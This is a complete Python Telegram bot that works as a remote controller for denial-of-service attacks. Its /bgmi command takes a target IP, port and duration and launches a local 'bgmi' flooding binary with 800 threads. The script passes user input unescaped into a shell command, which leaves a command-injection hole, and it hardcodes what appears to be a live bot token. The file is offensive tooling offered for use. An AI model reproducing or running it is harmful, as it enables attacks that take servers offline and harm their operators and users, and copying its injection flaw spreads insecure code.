#!/usr/bin/env python3
import os
import telebot
import subprocess
import threading
import time
from datetime import datetime
from flask import Flask

# ===== TERA CONFIGURATION =====
BOT_TOKEN = "8239702325:AAFLhq-mv7B911tMVSmSAheqK-Yn2kvMRVg"
ADMIN_IDS = [7518035096]
# ==============================

THREAD_COUNT = 800  # 48-Core ke liye optimized
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route('/')
def home(): return "Bot is Online"

def run_flask(): app.run(host='0.0.0.0', port=8080)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    if message.from_user.id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Access Denied!")
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "📌 Usage: /bgmi <IP> <PORT> <TIME>")
        return

    target, port, duration = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 *Attack Started!*\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s", parse_mode="Markdown")
    
    # Executing your bgmi binary
    subprocess.run(f"./bgmi {target} {port} {duration} {THREAD_COUNT}", shell=True)
    bot.send_message(message.chat.id, "✅ *Attack Finished!*", parse_mode="Markdown")

if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    print("🔥 Bot is starting...")
    bot.infinity_polling()
